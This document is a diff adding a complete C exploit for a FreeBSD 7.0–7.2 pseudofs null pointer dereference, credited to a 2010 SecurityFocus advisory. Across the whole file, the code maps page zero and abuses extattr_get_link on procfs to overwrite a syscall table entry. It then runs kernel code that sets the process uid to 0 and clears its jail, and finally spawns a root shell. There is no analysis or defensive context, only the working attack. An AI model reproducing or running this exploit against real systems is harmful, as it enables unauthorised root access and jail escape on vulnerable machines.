@@ -1,0 +1,114 @@
+/*
+ * Source: http://www.securityfocus.com/bid/43060/info
+ * 18.08.2010, babcia padlina
+ * FreeBSD 7.0 - 7.2 pseudofs null ptr dereference exploit
+ *
+ *
+ * to obtain SYSENT8_SYCALL_ADDR, run:
+ * $ kgdb /boot/kernel/kernel
+ * (kgdb) print &sysent[8].sy_call
+ */
+
+#define SYSENT8_SYCALL_ADDR	0xc0c4afa4 	/* FreeBSD 7.2-RELEASE */
+
+#define _KERNEL
+
+#include <sys/param.h>
+#include <sys/conf.h>
+#include <sys/ucred.h>
+
+#include <stdio.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <string.h>
+#include <stdlib.h>
+
+#include <sys/types.h>
+#include <sys/mman.h>
+#include <sys/proc.h>
+#include <sys/types.h>
+#include <sys/extattr.h>
+#include <sys/uio.h>
+#include <sys/turnstile.h>
+#include <sys/queue.h>
+
+struct turnstile {
+	struct mtx ts_lock;
+	struct threadqueue ts_blocked[2];
+	struct threadqueue ts_pending;
+	LIST_ENTRY(turnstile) ts_hash;
+	LIST_ENTRY(turnstile) ts_link;
+	LIST_HEAD(, turnstile) ts_free;
+	struct lock_object *ts_lockobj;
+	struct thread *ts_owner;
+};
+
+volatile int gotroot = 0;
+
+static void kernel_code(void) {
+	struct thread *thread;
+
+	asm(
+		"movl %%fs:0, %0"
+		: "=r"(thread)
+	);
+
+	/*
+	 * kernel_code() is called while thread is in critical section,
+	 * so we need to unset td_critnest flag to prevent panic after
+	 * nearest user mode page fault.
+	 */
+	thread->td_critnest = 0;
+	thread->td_proc->p_ucred->cr_uid = 0;
+	thread->td_proc->p_ucred->cr_prison = NULL;
+	gotroot = 1;
+
+	return;
+}
+
+int main(int argc, char **argv) {
+	struct turnstile *ts = 0;
+
+	if (access("/proc/curproc/cmdline", R_OK)) {
+		printf("procfs not found.\n");
+		return -1;
+	}
+
+	if (mmap(0, PAGE_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANON | MAP_FIXED, -1, 0) == MAP_FAILED) {
+		printf("mmap 0x0 failed.\n");
+		return -1;
+	}
+
+	memset(0, 0, PAGE_SIZE);
+
+	/* 
+	 * we need to call dummy extattr_get_link() here, to make
+	 * libc memory pages accessible without user mode page fault. without
+	 * it, panic will occur after next extattr_get_link().
+	 */
+	extattr_get_link("/dev/null", 0, 0, 0, 0);
+
+	/* overwrite sysent[8].sy_call with 0x0 */
+	ts->ts_blocked[0].tqh_first = (void *)(SYSENT8_SYCALL_ADDR - 0x1c);
+	extattr_get_link("/proc/curproc/cmdline", 0, 0, 0, 0);
+
+	*(char *)0x0 = 0x90;
+	*(char *)0x1 = 0xe9;
+	*(unsigned long *)0x2 = &kernel_code;
+
+	asm(
+		"movl $0x8, %eax;"
+		"int $0x80;"
+	);
+
+	if (gotroot) {
+		printf("oops, I did it again.\n");
+		setuid(0);
+		setgid(0);
+		execl("/bin/sh", "sh", NULL);
+	}
+
+	printf("exploit failed.\n");
+
+	return 0;
+}
